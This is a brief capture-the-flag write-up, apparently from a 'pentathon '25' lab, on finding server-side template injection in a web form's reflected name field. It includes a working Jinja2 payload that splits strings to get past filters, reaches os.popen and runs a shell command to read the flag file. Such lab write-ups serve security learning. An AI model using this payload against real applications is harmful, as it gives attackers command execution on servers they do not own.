
### Lab (pentathon '25)

Capturing the request and sending it, we can see that the `name` field is reflected back to us. Before trying `sqli` we input characters like `<>` to see if we can do `xss` payload. We also try `{{}}` to check for `ssti` (template injection).
Sending `{{7*7}}` we get back `49`. So the site is vulnerable to `SSTI`.

> After the server blocking some request and either giving us error or not allowed we get some progress using `{{request}}`.

Payload used for SSTI 
```
name={% set b = request.application[['__glo','bals__'] | join][['__buil','tins__'] | join] %}
{% set i = b[['__impo','rt__'] | join] %}
{% set o = i(['o','s'] | join) %}
{% set p = o[['po','pen'] | join] %}
{% set cmd = ['c','a','t',' ','fl','ag','.txt'] | join %}
{{p(cmd).read()}}
&email=test%40mail.com&message=Test
```



### References

Jinja2 - [Server Side Template Injection with Jinja2 for you now](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)